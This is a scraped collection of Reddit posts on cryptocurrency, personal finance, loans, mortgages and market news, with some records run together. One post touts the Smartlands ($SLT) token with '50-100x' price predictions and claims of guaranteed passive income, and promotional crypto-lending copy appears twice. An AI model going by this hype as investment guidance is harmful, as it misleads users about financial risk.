CryptoCurrency,"On Saturday I set a reminder on my phone for 10 years time to remind a friend that the price of bitcoin was $50,000","A lot has changed in the past year of COVID, one for me has been learning more about and investing in crypto's. With lockdown easing in the UK it meant I was finally free to meet up with some pals from university. One of them has a first class degree in economics and has very traditional views on finances and investing, so naturally after a few beers I asked him what he thought of crypto currencies (100% knowing what his response would be).

His views were that he trusts the government more than an internet 'algorithm' and that there is no store of value behind what a bitcoin is worth, ignoring my response that were was no store of value behind the US federal reserve's trillion dollars printed in 2020 (brrrrrr). He hopes that I make a lot of money but wants me to be careful of this potential 'scam'.

It was a pretty fun debate, especially when both parties were 100% convinced they're in the right. I ended it by setting the reminder in my phone for April 2031 to remind him that the price was once $50,000. I also told him that within the next 10 years he too will most likely end up owning crypto anyway, when all this misguided FUD weakens and it becomes more and more mainstream.

CryptoCurrency,Crypto resistance levels and nonsense artists,"From the land of quantitive analysis there came a certain practice, and latterly a religion of sorts, centered on the concept of resistance levels and their meaning.

At their core resistance levels describe pricing - up or down - against which an asset encounters resistance. At the up, it’s the maximum price people are willing to pay. At the down, it’s at the price where people cannot resist.

There are many ways to draw resistance levels and indeed some have reached a level of arcane art that deserves appreciation if not adherence. Lines, pillars and colors attempt to map out what has gone before, give it meaning, and apply it to the future.

The tools of this trade have become increasingly convoluted over the years, as with astrology or palm reading, due to the sheer number of adjustments that must be made. Confirmation bias needs a foundation, after all. And with the complexity has come that saddest of things: little questioned acceptance.

Quantitive analysis has its value. In the 1980s it closed a significant number of market inefficiencies, exposed clearly by numbers, yet missed to that date by the old breed of emotive traders. But since that period it has had a more troubled life.

And that is troubling in itself.

It is one thing to begin a numerical analysis of a field and to discover inefficiencies as they exist. It is quite another to tell the future based on the past, particularly when that future compounds complexity each minute further out you look. 

The issue that marks the delineation between the point where quantitive analysis can provide relative certainly and where it cannot is time. For each second that passes, millions of trades occur, and move in lockstep with thousands of new data points from the market. Earnings. Pauses. Contracts.

There is a concept in statistical analysis that has thrown national security programs as much as trading performance relates to false negatives and false positives. The more data you have, the more of these you. The more of these you have, the less reliable your conclusions.

And back to resistance levels we come.

If you explore the recent history of quantitive analysis you will note that it tends to have more success in high frequency trading than in longer (let’s call them normal) positions. This is mathematics at work. Your complexity at 100ms is exponentially smaller than at 1 second, let alone 10. 

When you pull back further, and try to call a day or a week or a month, the realm starts to shift from science to magic. It’s possible to be correct, of course, but it’s possible to be the opposite. And undue confidence may come from making a call that only has two answers: up or down. It’s hard to tell if a wall of mathematical runes or a toss of a coin provides more utility.

A resistance level is a judgement call based on observed behavior from the asset and investors in an asset. It is based on past behavior and a slice of the current, and this it offers certainty only if all variables remain the same as they were at the points of initial measurement. 

Resistance levels do have utility. If an asset keeps bouncing between 1.20 and 1.50, it is a reasonable call to say “it seems to bounce between 1.20 and 1.50 but not above or below.” And it is also reasonable to say “it is at 1.20 now so it may move upward again.” And so on.

This is about as far as resistance levels go. If it passes 1.50 the asset may have suddenly become popular on its merits, or because people turned to dislike against something else. If it drops to 1.10 there may be a crisis of confidence, or just something more shiny in the market.

Initial guesses on pricing movement have a certain respectability that secondary guesses, based on a second if, seldom have. Arcane runes aside, one might find oneself equally well-briefed by picking up the Wall Street Journal or the Financial Times and checking the headlines.

Well, dear reader, there we leave it. Apply the words above as you see fit, from with interest through to distain, and all the stances in between. But never forget that neither stars nor sticks nor incantations have ever foretold the future, nor will they.",cryptocurrency
CryptoCurrency,The SLT Platform and a Case for Being First,"*“There are three ways to make a living in this business: be first, be smarter, or cheat. Well, I don’t cheat. And although I like to think we have some pretty smart people here in this room****, it sure is a hell of a lot easier to just be first.”***

*— Margin Call*

I want to take you back in time.  The year is 1984.  It’s a beautiful sunny Saturday in California – it’s as hot as a taint after a long-distance marathon.  I know some of you are asking; “wtf is a taint”?  It is that little piece of skin between your balls and your butthole – the circulation is terribl… nay, it doesn’t exist.  It’s fucking hot… and unlike 80% of the other people in California, I don’t have a pool. What I do have is a basement.  Not my basement mind you; my mothers’ basement.  It is generally cool in the basement and it’s a pretty awesome place to hang out.  I can still picture the Rush posters, my killer stereo, and the best gaming table for DnD that I hand crafted with my dad after he gave up on the idea that I would ever play sports.  The taste of Pepsi and Cheesies still give me nostalgia. 

That particular day I invite my friends to seek refuge from the heat and roll some dice.  You know those perfect days?  The 80s were filled of them.  Oil was plenty, energy was cheap, the economy was taking off like a pop rocket, and I had not yet discovered the concept of existential dread.  It was nice, man.  It was really nice.

This day was filled with adventure on the DnD board – but we kept getting interrupted by my friend Dave who was unusually enthusiastic about something that was giving him a pop rocket.  His father worked in what is now known as Silicon Valley, and had told him about this company that wanted to get computers in every house in the USA.  We kept shrugging him off of course – more interested in whether or not my Paladin could deal some damage to the Zombie hoard.  It was a big deal okay?  Dave however was persistent… he told us that he put all his money that he had saved for the past 4 summers mowing lawns into buying stock of this company… and he pressed us to do the same.

“Seriously guys! This is going to revolutionize the world!!”

I bit into my apple; looked at him with dismay and sighed… “Dude you’re holding up the game, can you roll the fucking dice already?”

Dave rolled the dice… and he never worked a day again in his life.

**&gt;&gt;&gt;**

Fast Forward to 2011...  My nephew is visiting from New York – he’s kind of a shit but likeable enough.  I still frequent my basement but DnD has evolved into something else entirely... now we have entire 3D worlds and can interact with NPCs and other characters controlled by real people all over the world, all from the convenience of our personal computers in our own homes (fuck you, Dave). The world was revolutionized.  The 2010s were kind of strange.  Existential dread was starting to set in.  I spent a lot of time on my computer during that time period. I think I was hiding from the real world. I was a cooler person online, still am.

My nephew was one of those typical fratty douchebro types.  He was staying with me while he hunted for work in Silicon Valley  - he has determination I will give him that.  One evening just as I sat down to log onto the server my friends and I frequent – he comes home from being out at some kind of networking event for Silicon start-ups.  He’s drunk, and annoying – but he’s also more enthusiastic than usual.  He starts talking to me about how he just learned about this magical digital money and how it was going to change the world and asked if he could use my computer because he needed to buy some.

“I just logged on, man!”

“Dude, seriously this is going to revolutionize the world…  let’s get some together”

“That’s the dumbest thing I’ve ever heard… go play with your phoney bit money somewhere else”

He’s still playing with his bitmoney… except now he lives in Manhattan.  He has a lambo.  He’s basically the WSB guy if that guy jumped out of the screen Kool-Aid Man style.  This guy fucks and he sucks at the same time.  I’m a little jealous.

“Never again….” I tell myself.  “Never again.”

**&gt;&gt;&gt;**

So fast forward again to the present day, February 2021.  I’m still hanging out in the basement.  I’m still on my computer… but grinding has taken on a whole new meaning.  I’m relentlessly trading, investing, and researching blockchain and crypto projects.  I’ve been doing well, but the more I work at the trade the more I start reminiscing about Dave and my Nephew and what they had in common – **they were first buyers of a first mover that revolutionized the world.**   They were able to identify and predict the future.  They weren’t just lucky assholes – **they got “it” before “it” became mainstream.** 

**Which is why I want to talk to you about Smartlands ($SLT)**

I was introduced to this project back in February after reading an article about the disruption of blockchain technology within the Real Estate market and how the blockchain was going to revolutionize this multi-trillion dollar industry.  Naturally, I started to research use-case studies and developers who were making strides in the industry. **This eventually led me to Smartlands.** In a nutshell, their vision is to bring together smaller investors and owners of illiquid assets through issuance of asset or security backed tokens.  **They want to be the first digital investment bank and alternative investment platform.**  This is a revolutionary concept.  I personally feel like it is the next big thing in blockchain technology.  They are true First Movers within this space.

Hear me out: You know how in the old days how your paper money used to represent a stored figure of value (gold) in the federal reserve?  It’s kind of like that – except we’re not limited to gold as the store of value – it could be a commercial apartment building, a piece of art… the possibilities are endless.   **We are on the verge of making appreciating assets that formerly had no liquidity, liquid.**  I can’t understate how big this is.  Think about it. Think about all the small/medium sized businesses that can value from this structure (SMEs are part of their target market).  Think about all the property owners that will leverage this for funds.  Think about all those with big Van Goghs on the walls.  Take a long hard thought. Think about all the locked value in the world… **unlocked**.  This is the future**.  This is going to change the world.**

This is where the $SLT token comes into play.  The SLT token is part of the revenue sharing structure of the Smartlands Platform.  It really has nothing to do with the asset backed tokens on the platform - these will be security tokens that represent the stored value of the asset.  **By purchasing SLT tokens, you’re investing in the platform instead of the assets listed on the platform.**  It’s a simple way to receive revenues from the fees listed and sold on the platform.  This means as the platform grows – so will the value of $SLT.  Let me explain: As fees are generated on the platform (see article below for further info), 1/3 (33%) will be redistributed to qualifying $SLT holders who are staking in the platform. This is real, tangible money, generated by fees with the platform, and redistributed to investors.  It’s kind of like a dividend, paid monthly. 

This means that in theory, even in a bear market,  as the platform continues to grow, the fee sharing structure will keep buying pressure up on the $SLT token (there’s also a frickin’ buy bot!).  **If the platform is generating fees - you will get a monthly payout regardless if the $SLT token goes up in value, or goes down.**  If it goes down, you better believe I’m going to pick up enough to live comfortably on passive income for the rest of my life… it’s quite simple, really.  The thought of potential revenue/fees in a bear market? Passive income potential?  Beam me the fuck up, Scotty!

The best part? **Smartlands is on the verge of launching their alternative investment platform this month** **(yes, this APRIL, as in a couple days from now..).**   They are also going to be listed on a few Tier 1 exchanges in either May or June.  The other thing ?  Maybe the best thing?   **This thing has a circulating supply of 5.1 million**… we’re sitting at around $14-16/token at the time of writing - it’s really not unfeasible that this thing 50-100x or more before the end of this bull market. If it (SLT Token) hits a 1 Billion Market Cap (conservative estimate) you are looking at $200 USD per SLT...an easy to obtain MC without the platform speculation.  Currently it’s a hidden gem on the Stellar Decentralized Network (SDEX) - but once it gets on a few big exchanges…oh man, that’s juicy.

I firmly believe that this is going to revolutionize the world.  I also firmly believe that we are close to a transition shift for real world utilization of block-chain technology.  This is still very early.  We are on the verge of history… and this time?  This time I’m not going to miss the boat. It’s a new era of capital management, and It’s my time to be first.

The choices we make today create the future that we are dreaming of.”

personalfinance,Using all of savings instead of taking out loans? Any thoughts/advice/anecdotes are much appreciated!,"Hi! First-generation college student here so honestly any insight would be super appreciated. 

I have paid off all my undergrad loans and since have been working for several years and saving up. I just found out that I am able to do the master's program I got into part-time. So instead of taking out about $35K loans and completing it in 3 semesters/1 year (\~88K), I can do it part-time while working a full-time job. Since now the payment is spread and I can work simultaneously, I wouldn't have to take out loans but would still need to probably use up most of my savings for tuition/rent/lifestyle. 

So I'm eligible to receive $10,250 in unsubsidized federal loans per semester.  Thoughts on if I should still take out this portion of the unsubsidized federal loans to help allocate for tuition, while keeping that 10K as an emergency fund/nest egg? Or is it better to just pay off everything and not consider loans because of compounding interest (4.3%) + loan fee (1.2%)?

Thank you so much in advance!!",finance

btc,Сryptocurrency Interest Rates as Debated Market Topic,"Lending, borrowing, staking and cryptocurrency allocation are becoming increasingly important in the crypto finance sector, one that may end up shaping how the underlying assets themselves are valued and priced on other markets.

On traditional financial markets, interest rates reveal significant information about the health of the economy and form the basis for almost all asset valuation models. Whether calculating expected returns or present and future market value, the interest rate is a key variable based on the lending and borrowing of assets.

Interest rates for cryptocurrencies incentivize users to loan out their crypto assets because users can earn higher returns by lending their assets than they could have by storing them in a personal wallet or device. Rates for cryptocurrencies, coupled with strong demand for borrowing, would free previously idle balances of capital for investing, trading, and generating new market activity.

Despite the benefits that active lending, borrowing, staking, and allocation would generate for the cryptocurrency industry, investors, and overall market activity growth, the sector is still in the early stages of development.

Interest on crypto deposits can vary by up to 16 percentage points, depending on the platform. This variance exists in large part because of the difference in business models.

Service providers, such as Nexo, borrow cryptocurrencies from primarily retail customers and provide loans in fiat. Others, such as [Crypto.com](https://crypto.com/), enables customers to stake cryptocurrencies through locking coins up for a period of time by using an app. Decentralized finance (DeFi) lenders, such as MakerDAO, facilitate loans strictly financed in crypto and paid out in also crypto. Platforms like [Midas.Investments](https://midas.investments/) rely on allocations and all available mechanisms for earning yields enabling to invest in a managed and automated investment portfolio based on a strategy with rebalancing.

Each of these services attracts different client segments with varying expectations of fees and service levels.

Over time, companies with competitively low-interest rates on cryptocurrencies will go out of business. The natural dynamics of the free market, as applied to any industry, weed out inefficient business models and promote standards of practice through competition. As the sector grows and consolidates, interest rates are likely to converge to sustainable levels.

Until then, users will have to endure a high variance of rates, even within a single platform.",cryptocurrency
personalfinance,My credit was decimated during the pandemic and I’ve hit a wall trying to rebuild- any advice or insight is welcome!,"Hi everyone, thanks for your time!

Some context- I’m a 25 year old professional musician, and prior to the pandemic I had been making a living traveling around the country following different gigs week to week.  Last February/early March I had finally started to stand on my own two feet financially for the first time in my life before all of my work evaporated overnight.  I blew through what little savings I had in a little over a month, and it took a few months after that for me to finally qualify for unemployment due to the unconventional nature of my income.  

Unfortunately one of my student loans was a private loan administered by my alma mater and therefore wasn’t protected under the CARES act, and because I was unable to pay those bills my credit score shot down to the low 400s within 2 months.  (I spoke with my alma mater about refinancing/postponing payments and they basically told me to go fuck myself)

I finally managed to get on UI and find some virtual work here and there, so I have been consistently paying my bills on time and in full for almost a year now.  I also opened up two different secured credit cards and with which I’ve been buying groceries and paying off the balance immediately.  Of course all of this boosted my credit score significantly, but in January it stopped at 618 and hasn’t budged in about 4 months.

I’m trying to apply for an apartment so I don’t have to constantly float between 1-2 month sublet situations, but unfortunately the bare minimum credit requirement for most landlords/management companies here in NYC is ~700 and I’m still a long way off.  (I don’t have a guarantor, so getting my credit over that threshold is a must)

Here is a breakdown of my debt:

Total $61,900 (11 accounts total)

8x Fed Loans totaling in ~$55,000

1x private loan (from alma mater) making up the difference ~$6,900

2x secured credit cards (B of A and Capital one)
$0


My average credit age is approximately 4 years and 4 months.



Are there any immediately actionable steps I can take to help boost my credit toward that threshold in the next few months?  Please let me know if there is any more info I can provide to clarify my situation- thank you so much for your time!

\- so he made the decission, like many of turkey ppl, to invest in BTC. He bought from his life savings BTC at around 60k in March  
\- The Btc dropped to 50k  
\- His goverment stopped the BTC exchange until end of april  
\- He sold at BTC 53k (lost 10% of his life savings again)  
\- Yesterday evening at the sunday btc dip a lot rumor goes around in the turkey community that the btc will drop to 43k and below. He got some financial advice to take his monay in a future short BTC (he never made it before, had no idea from s/l's)  
\- he woke up today morning with a liquidation

Ive been mulling it over for a few weeks now and im still not entirely sure what then best course of action is. Im a 27m in college going into my last year starting in the fall. I have a car loan in my name that I split the payment with my dad (he primarily drives it since I have my own car that I drive daily) because I bought the car years ago when I was young and naive and I had a 22% interest rate on this car and he agreed to help me pay the monthly payments (they were $527 at the time). Fast forward a few years later and some added financial wisdom and I refinanced down to a 36 month 3.84% interest rate paying $330 a month that we both split (the payoff amount for the car is 7900), so I'm paying $165 for this car. I have $7500 in my emergency savings (approx 6 months of expenses). Im not currently working as covid killed my job last year and so I decided to focus all my time on school ( I am still claiming unemployment so its been helping pay the bills while I focus on graduating) and I have a couple of job interviews for jobs for the upcoming summer through till next May. So my question Ive been wondering is if it would be wise to pay off my half of the car with some of my savings, which would be $3950 or should I just keep paying my half. We have about 2 years left before its paid off in full ( we both are tired of paying for the car, not that we cant afford it, I just wanna lower my expenses) A side note is that I might be looking at apartments in the fall and I figured if I didn't have that $165 car expense I could use that money towards rent.",finance

personalfinance,Is there a time frame for when an employer needs to fix a w-2 (father's final return),"My father passed in mid 2020. As the sole beneficiary I inherited his stock options from his company, exercised them all, and of course paid the (automatically withheld) tax. 

It was 3.2 mm in stock options and about 1.1 mm in federal taxes. 

Unfortunately his employer accidently included the stock option sale on his W-2 with his 2020 salary (500 K), when it should have been a 1099 misc for me and paid based on my taxes.

I brought it up to the employer about a week ago and they said they are seeking outside counsel for help, no response yet

&amp;#x200B;

My CPA/Tax attorney team says if they do not correct it WE CAN reconcile (somehow) by requesting a refund on my father's tax return of the taxes owed (1 mm or so), and then having me pay it on my name as part of my taxes. 

This seems like a very complex way to do this and while I do have 1 mm in cash laying around specifically for this purpose it makes no sense.

economy,Pls help me understand this interest rate concept,"Pls explain the interest rate movements in diff economy phases - when do they increase and decrease and its impact in terms of deposit rate interest and loan interest Eg. In recession, interest rate is lowered to boost the economy however itmay only help from the loan point of view (I.e benefit those people that have taken a loan and hence have to now pay low interest) but not from a deposit point of view (i.e people who have deposited money in say FDs etc for interest might get lower interest rate) so there’s a counter effect and people might not necessarily benefit since the people who deposit could be more than those who take loans. 

Pls explain with an example and also whenever the term ‘interest rate’ is used in the news like interest rate is lowered or increased - which interest rate does it refer to (the interest in deposit or loan) and the decision to lower or increase the interest rate depends on the incentive to lower the borrowing interest rate or the interest rate on deposit?

personalfinance,"Rolling 401a (government 401k) into IRA, then Home Purchase?","I appreciate any advice. I work for a school and we have a State university retirement system, basically a 401k for gov workers.

Should I transfer all that money to a traditional, or Roth IRA, and can I then transfer out of there for a first time home purchase?

stocks,What's Happening in the Markets: Week of 4/26/2021,"Hello Traders and Investors! An exciting week ahead of us, here is my weekly newsletter which I share every Monday to help prepare you for the week! Feel free to DM me and happy trades!

**Week of 4/26/21**

The S&amp;P500 opened Monday 4/26/21 at 4185.03, above the previous close of 4180.05 on Friday 4/23/21.

Chip manufacturers have been inundated with demand following 2020’s COVID shutdowns and the, undoubtedly correlated, increase in demand for consumer electronics. Cisco, one of the world’s largest chip manufacturers, is struggling to keep up with demand.

Cisco revealed several steps it is taking to alleviate the imbalance in supply and demand including a $4.5 billion acquisition of Acacia Communications and a $20 billion plan to build two new manufacturing plants in Arizona. Cisco CEO Chuck Robbins commented extensively on the situation, and estimates it could “...\[take\] another six months…” for the company to resume normal operation. Around 85% of all internet traffic passes through Cisco hardware.

The effects of the shortage can be seen across industries. Among companies affected by the shortage are car manufacturers. Wayne Griffiths, head of VW’s Spanish brand, spoke on the issue, stating that the company will, “...need to face considerable challenges in the second quarter…” So far the shortage has prevented the company from building over 100,000 vehicles.

The United States Government has also expressed concern regarding the chip shortage. United States President Joe Biden held a conference with business leaders earlier this month to address the issue. During the conference the President expressed a desire to move more chip manufacturing into American plants, citing 75% of global manufacturing as being based in East Asia.  
Meanwhile Taiwan-based chip manufacturing giant TSMC has announced a plan worth $100 billion USD to expand their companies manufacturing capacity. The announcement comes in tandem with company founder Morris Chang’s plea to the Taiwanese government for increased support, citing a fear that if the Taiwan-based manufacturer fails to meet demand US or Chinese manufacturers will fill the gap.

The increase in demand for electronics caused by the pandemic has boded well for Apple, who reports earnings on Wednesday. Analysts are looking for the technology giant to post earnings of $0.98 on revenue of $77 billion after a strong Q2 for sales. The earnings call comes on the heels of Apple’s first product showcase of the year last Wednesday, and the company’s announcement that it will be taking steps to increase its footing in the instant messaging market. Apple stated it plans to increase the amount of features provided by it’s iMessage app, with the objective being to bring it more in line with popular messengers offered by Facebook, WhatsApp, and Snapchat.

Microsoft will report earnings Tuesday. Analyst estimates place earnings around $1.78 per share over $43 billion in revenue. Microsoft, who also saw an increase in demand for its technology as a result of the pandemic, has greatly benefitted from an increased demand for cloud-services. Microsoft’s cloud-based service hub, Azure, posted 2020 growth of 43%. The company expects to post great earnings despite the current chip-shortage, having generated much of its growth from the pandemic in the software-as-a-service sector.

Executives from Facebook, Twitter, and Youtube will testify before a U.S. Senate Judiciary hearing committee on Tuesday. The executives have been called to testify on the use of algorithms to dictate what consumers watch and read on the popular platforms. The hearing comes amid concerns that manipulative practices have led to massive distribution of misinformation, with repercussions that reverberate throughout society. The practice of purposefully serving consumers misinformation has been dubbed “algorithmic amplification,” and the results of the hearings could have a significant impact on the social media industry. All three companies will report earnings this week.

OPEC will hold its opening session Wednesday. The conference will take place over the course of the day, and will include remarks from prominent Russian and Saudi chairman. The conference is meant to be informative and expected to feature little remark on policy. However speculation that additional information on a potential NOPEC bill could have an impact on U.S. trading. The conference comes one day before North American oil giants Exxon and Shell report earnings.

Federal Reserve Chairman Jerome Powell will hold a press conference at 2:30PM Wednesday. Powell’s recent statements at press conferences have highlighted an economy which although largely recovered, still faces a degree of risk in the face of the pandemic. Powell stated in an April 11th CBS interview, “The principal risk to our economy right now really is that the disease would spread again more quickly.” Powell’s comments come a day before advanced release of the Q1 U.S. GDP, which Bank of America analysts predict will show a real growth rate of 6.5%.

**Some of the Companies with Earnings this Week**

**Monday, April 26th:**  
Among others, Tesla (TSLA) will hold earnings calls today. Tesla looks to top analyst estimates of $0.75 EPS on $10.5 billion in revenue after a successful quarter for delivery numbers in the face of the ongoing chip shortage.

personalfinance,State tax amendment,"Sorry if this is the wrong place. I amended my 2018 return last year and it's just not adding up for me; can someone help me understand?

I filed in 2018 and owed $44 for some reason. Last year, there was a tax deduction that became available again so I amended federal and state to get a refund. I mailed the proper forms in and both were accepted. No problems with getting the full amount for federal refund.

My state amendment refund was for $120. I got a letter from the tax office with this amount listed as my refund amount and it was automatically calculated on the GA Form 500X (line 31). However, I only got $76 + interest refunded. I was told it was because of the $44 that was owed in 2018 (which was paid when I initially filed my taxes). I guess I'm trying to understand if I qualified and was approved for a $120 refund that was clearly stated on the the amended form and letter from the tax office, where are they getting this $76? Shouldn't I get $76 + $44 = $120?",finance

economy,Cryptocurrency Interest Rate is a Reality that Cannot Be Stopped,"Lending, borrowing, staking and cryptocurrency allocation are becoming increasingly important in the crypto finance sector, one that may end up shaping how the underlying assets themselves are valued and priced on other the markets.

On traditional financial markets, interest rates reveal significant information about the health of the economy and form the basis for almost all asset valuation models. Whether calculating expected returns or present and future market value, the interest rate is a key variable based on the lending and borrowing of assets.

Interest rates for cryptocurrencies incentivize users to loan out their crypto assets, because users can earn higher returns by lending their assets, than they could have by storing them in a personal wallet or device. Rates for cryptocurrencies, coupled with strong demand for borrowing, would free previously idle balances of capital for investing, trading, and generating new market activity.

Despite the benefits that active lending, borrowing, staking and allocation would generate for the cryptocurrency industry, investors and overall market activity growth, the sector is still in the early stages of development.

Interest on crypto deposits can vary by up to 16 percentage points, depending on the platform. This variance exists in large part because of the difference in business models.

Service providers, such as Nexo, borrow cryptocurrencies from primarily retail customers and provide loans in fiat. Others, such as [Crypto.com](https://crypto.com/), enables customers to stake cryptocurrencies through locking coins up for a period of time by using an app. Decentralized finance (DeFi) lenders, such as MakerDAO, facilitate loans strictly financed in crypto and paid out in also crypto. Platforms like [Midas.Investments](https://midas.investments/) rely on allocations and all available mechanisms for earning yields enabling to invest in a managed and automated investment portfolio based on a strategy with rebalancing.

Each of these services attracts different client segments with varying expectations of fees and service levels.

Over time, companies with competitively low interest rates on cryptocurrencies will go out of business. The natural dynamics of the free market, as applied to any industry, weed out inefficient business models and promote standards of practice through competition. As the sector grows and consolidates, interest rates are likely to converge to sustainable levels.

Until then, users will have to endure a high variance of rates, even within a single platform.",finance

personalfinance,Using TSP loan to pay down federal student loans?,"I have about 100K in federal student loans and am thinking of ways to pay them down quickly when payments eventually resume. I have a TSP through my employer which I think is similar to a traditional IRA. Would it be wise to maximize my contributions to my TSP and take it all out in a loan to put towards my student loans? Can I borrower the entire amount, including the employer contributions once they vest? 

In my mind it’s better than paying my loans directly because it’s pretax and I think I can borrow the additional employer contributions. The interest rate of the TSP loan is muuuch lower than the interest rate on my student loans. Plus I wouldn’t lose the benefits of having federally held loans like I would by refinancing my student loans. Thoughts? There could be some mistaken assumptions here.

Edit: I’m not expecting to pay down my loans entirely with a TSP loan I just feel like this is the smartest way to put my money to work.",finance
personalfinance,"Would love some advice regarding where to put savings, and what to do with current student Lon debt.","It’s obvious that I can’t spell; *loan, not Lon.

Good morning y’all,

Really enjoy what I’m seeing being posted on this subreddit, lots of good advice and I’m hoping y’all would be able to help me with the following (I appreciate your patience in advance):

I’m 25, single. Live by myself. Have been saving aggressively since college, and have been incredibly fortunate to have support from my parents in various things.

My savings are broken down in the following manner:

• Around $31k in general savings account (pretty low interest, but I absolutely love the bank I use);

• Around $19k in stocks/ETFs;

• Around $16k in Roth 401k + HSA;

• Around $3.6k in savings bonds;

After all monthly expenses are said and done, I’m able to save around $2.3k a month (that includes funds that are automatically sent to my Roth 401k + HSA, as well as funds that I take directly from my paycheck and throw into stocks/ETFs — nothing is going to my general savings account anymore). I don’t currently budget for “fun-money” right now — this is just a “break-even” analysis, of sorts.

Now, I have around $8.3k in student loan debt. This is the only debt I have (i.e., no CC debt with high interest — I’m able to make my payments in full and on-time every month; no car debt, etc.)

So, I have two questions:

• USUALLY, I’ve been paying $300 a month to student loans (federal Stafford loan), but as of right now, because of the pandemic (0% interest), I haven’t been paying, and instead have been throwing that extra $300 into stocks/ETFs. It doesn’t make a lot of sense to be paying into it right now if it’s at 0% interest, right?

• I could technically wipe out that $8.3k right now if I wanted to, from my general savings account. But, I’ve been holding off on doing so, since I’ve been hearing that there’s a chance that Biden will wipe out up to $10k? Is this a smart move? I would just start paying again in September if not, it’s not a big deal. I’m just saying that it’s an extra $1.5k (May-September) that I’d be able to save and throw into stocks/ETFs.

• Is $31k too much in my general savings account? I’ve calculated an emergency fund of ~$12k I believe, for a 6-month fund, but I’ll need to go back and check.

Any insight you might be able to provide, would be greatly appreciated. Thank you in advance.

financialindependence,FIRE Journey With a Growing Family (26M),"Hello everyone! First time poster, long time lurker.

Just hit 300k NW! Most of it in index funds. Some info about my journey thus far.

**Backstory:** Parents immigrated to America from the soviet bloc in the 1980s. My dad literally came into the US in his 20s with a suitcase and $400. He is now nearing traditional retirement and has a NW of over 5M. American Dream is still very much alive! I had a relatively easy upper-middle class childhood. Went to a local community college for 2 years before transferring to an in-state university. I worked during school and split tuition costs 50-50 with my parents. Graduated debt free.

**Age:** 26

**Family:** Married with 2 boys (2 year old &amp; 1 month old)

**Occupation:** Electrical Engineer

**Income:**

\- 2016: Graduated college. Landed first job which paid 60k

\- 2017: Same job, 64k.

\- 2018: Girlfriend stuck around after I got laid off so naturally I wife'd her! Found a new job paying 75k.

\- 2019: Landed dream job with major Aerospace company. 'Only' 87k but with MUCH better benefits. Also had our first boy. Wife became a stay-at-home mom.

\- 2020: Same job, 89k. Due to COVID we began working virtually. Wife started side business.

\- 2021: Same job, 93k. Significant promotion imminent. Wife's business now regularly netting over $1,000/mo. Had our second boy. After repeatedly pushing back the date when we would return to the office, company announced my job will remain virtual even after COVID.

**Debt:** No debt!

**Additional Details**: Since I started working remote, my desire to FIRE has only increased. Being home and seeing my kids grow up, having more free time and the freedom to plan my day how I want it is awesome.

**Advice for those wanting to FIRE with a growing family:** Kids aren't as expensive as everyone makes them seem. I lucked out with my health plan ($900 family deductible) and also with a super thrifty wife who manages to find everything we need for pennies on the dollar at local thrift stores/yard sales. My net annual savings rate hasn't really changed since having kids. Now I'm not going to say it's easy, but if you're already relatively frugal, adding kids into the equation shouldn't affect your FIRE journey all that much.

**Finances:** My wife and I are Christians, so giving to charities is something important to us. We give generally about 10% of our take home income to missionaries, outreaches and local community non-profits. I realize this may push back out FIRE date, but we are ok with that. Other than that we have a pretty good savings rate, maxing out my ROTH IRA and almost maxing out my 401k.

**Plans for the Future:** All my current projections have me hitting my FIRE number by my mid 40's. We do eventually want to move to a lower COL area, and start our own homestead. When the housing/lumber market dips, we'll probably buy and build.

This isn't your typical FIRE journey, but I still believe reaching FIRE at a (relatively) young age is still possible with a growing family and a non-software career.",finance
personalfinance,Mortgage Loans Advice (does it make sense to get higher interest for lower closing costs),"Hello all!

Me and my fiancée are in the process of ironing down out mortgage after having a contract for a house recently be accepted. The lender has presented us with a couple of options and I wanted to get some others input on the situation. 

The mortgage loan is for a single family home in a high cost of living area. We don't plan to keep the house but for a couple years. I am toying with the idea of pursuing a higher interest rate loan, or even requesting one to minimize closing costs and take advantage of lender credits. 

The loans are broken down to the following:

Assume **30 year** mortgage for all options\*

||Option 1|Option 2|Option 3|
|:-|:-|:-|:-|
|Sales Price|663000|663000|663000|
|Loan Amount|596700|596700|596700|
|Interest Rate|3|3.125|3.25|
|Total Fees @ Close|15109|10664|7711|
|Monthly Payment|3341.86|3382.27|3423.00|

*Extra Info*

* We are putting 10% down
* PMI is \~$114 monthly
* We plan to try and sell within 2-3 years

With the rates as low as they are now, does it make sense to take the savings on upfront closing cost and keep the money invested elsewhere? I am not a finance major (mechanical engineer), but to me it looks like Option 2 saves money until \~9 years of ownership, and Option 3 might be around \~8 years of ownership.

I have a fair amount of money in the stock market that is performing well, I tend to beat any of the loan interest rates yearly from my investments. Am I crazy to think we should negotiate to higher interest rates and save thousands more of money at close if we plan to keep the house short term? 

Any input or metrics you think I should add to help analyze would be greatly appreciated. This is our first home purchase so we are desperate for any help we can get. 

Thanks!",finance
personalfinance,Can I capitalize on low used car inventory to sell or trade my car with an underwater loan?,"I currently have a loan on a 2012 Lexus IS 250 AWD with 87K miles. I now look at this purchase as something that was probably a mistake. The loan has been underwater since I bought the car in November of 2018, my interest rate is pretty rough at 7.49%, and I still owe $15500 on the car with 42 remaining monthly payments of $442. 

Unless requested, I won’t go into the circumstances that led to this purchase. I’ll just sum it up and say that I now know it was not the wisest decision. 

Anyway, the purpose of this post is to figure out if I can capitalize on the current used car shortage to get more money out of this vehicle or if I’m better off trying to refinance the loan or just pay it off (which is something I could probably accomplish in the next year if I put a heavy focus on that instead of renovating my home). 

I keep seeing reports that people are getting trade in offers that are higher than the supposed market value of their vehicles. I believe that could be the case for mine since it is certified pre-owned, has always been serviced by a Lexus dealership, and has 2.5 years of an extended warranty from Lexus remaining. From what I understand, the warranty is transferable with the vehicle, but I’d need to verify if that only works for private party sales or if a dealership could take advantage of that. I think this option is worth considering because if I could upgrade to a new SUV, e.g. a Toyota RAV4, while only increasing my monthly payment by $50-$100 with a 60 month low interest loan, then I feel like I am getting more value out of that scenario. It seems likely that I could get such a loan since I have much better credit and a much better debt to income ratio than I did when I bought my current vehicle. I also feel like the future value of this hypothetical vehicle is likely much better than the future (and current) value of my current vehicle. 

For the refinancing end, it looks like I could get a better rate since my credit is in great shape. I’m also willing to put a chunk of cash in to lower the principal amount so that I can get a better rate. However, I’m seeing that with the age of my car and the underwater loan status I may not be able to get as great of a rate as I’d like. For example, I got an instant offer from Tresl for a loan of $15,900 at 5.25% for 60 months which seems less than ideal. 

EDIT: I also did put the information for the vehicle into CarMax’s online system and got an offer of $11,400. I’m hoping I could beat this offer, but maybe that context helps give more insight into my best move. 

Does anyone have advice on what my best move might be? The current monthly payments aren’t horrible for me to handle, but I just know that I could be doing better.

